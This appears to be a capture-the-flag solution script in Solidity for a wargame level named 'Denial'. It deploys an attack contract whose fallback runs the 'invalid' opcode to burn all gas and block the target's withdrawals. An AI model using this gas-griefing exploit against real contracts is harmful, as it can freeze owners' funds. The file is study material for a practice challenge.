// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {Denial} from "src/Denial.sol";

contract Attack {
    Denial target;

    constructor(Denial _target) {
        target = _target;
    }

    function targetCall() public {
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            invalid()
        }
    }
}

contract Solve is Script {
    Attack attack;
    address instanceAddr = 0x6B577112436209a90b80D539bE2F3114d001DcF8;
    Denial target;

    function run() external {
        target = Denial(payable(instanceAddr));
        vm.startBroadcast();
        attack = new Attack(target);
        attack.targetCall();
        vm.stopBroadcast();

        // vm.startBroadcast(address(0xA9E));
        // target.withdraw();
        // vm.stopBroadcast();
    }
}
